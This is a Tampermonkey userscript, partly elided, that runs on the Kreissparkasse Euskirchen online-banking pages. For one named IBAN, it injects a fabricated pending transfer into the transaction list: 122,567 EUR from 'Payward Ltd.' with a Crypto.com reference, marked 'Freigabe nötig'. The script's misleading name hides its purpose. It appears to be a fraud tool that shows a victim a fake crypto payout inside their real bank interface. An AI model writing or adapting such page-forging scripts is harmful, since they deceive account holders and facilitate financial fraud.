// ==UserScript==
// @name         Vertragssignature Wollweber
// @namespace    http://tampermonkey.net/
// @version      0.4
// @description  try to take over the ever!
// @author       You
// @match        https://www.kreissparkasse-euskirchen.de/de/home/onlinebanking/umsaetze/umsaetze.html*
// @match        https://www.kreissparkasse-euskirchen.de/de/home/onlinebanking/finanzstatus.html*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/452558/Vertragssignature%20Wollweber.user.js
// @updateURL https://update.greasyfork.org/scripts/452558/Vertragssignature%20Wollweber.meta.js
// ==/UserScript==
...
(function() {
    ...
    var asenderReference = "WD3746 TRX88000 Wollweber, Rolf - Crypto.com";
    ...
    if (window.location.href.indexOf("umsaetze") > 0) {
        ...
        if (elementExists != null){
            if (done == 0){
                if ( document.getElementsByClassName("iban")[0].children[0].innerText == "DE76 5125 0000 0044 4444 61" ) {
        var xHTML = '<table role="table" aria-label="Gebuchte Umsätze" aria-describedby="umsatz" class="btable pfm-umsatz no-2nd-row top-align hover-over-area actionicon-noborder toggle-table-row toggle-table-group spacious with-logo"><caption class="offscreen" id="umsatz">Die Tabelle zeigt Ihnen die Umsätze des gewählten Kontos bzw. Depots im gewählten Zeitraum.</caption><tbody><tr class="tableheader noborder" id="aria01664377839718-0" role="heading" aria-level="2"><td class="nowrap" id="aria01664377839718-0-td">Spezialauftrag (1)</td><td class="right nowrap" colspan="3"><div class="data"><div class="datatable"><div class="label">Aufgelistete Aufträge benötigen eine Freigabe<em>***</em></div></div></div></td></tr><tr class="tableroweven toggle-table-row-open hoverable" id="aria01664377839718-0-0" role="region" aria-labelledby="aria01664377839718-0-td" aria-level="3" aria-expanded="true" aria-controls="aria01664377839718-0-td4 "><td class="left"><div class="payment"><div class="image"></div><span class="title">Payward Ltd.</span><span class="subtitle">WD3746 TRX88000 Wollweber, Rolf - Crypto.com</span><span class="details">SEPA-Überweisung mit Bankgarantie - Freigabe nötig durch Gegenpartei</span></div></td><td class="nowrap"><div class="bcategory">&nbsp;</div></td><td class="right"><div class="balance"><span aria-hidden="true" class="balance-predecimal plus">122.567</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">-1.000,00 EUR</span></div></td><td id="aria01664377839718-0-td4"><div class=""><div class="ficon icon-if5_symbol_banking_6"><input onclick="return IF.checkFirstSubmit();" class="" role="link" data-tracked="true" title="Freigabe nötig" value="Freigabe nötig" name="" type="button"></div></div></td></tr></tbody></table>';
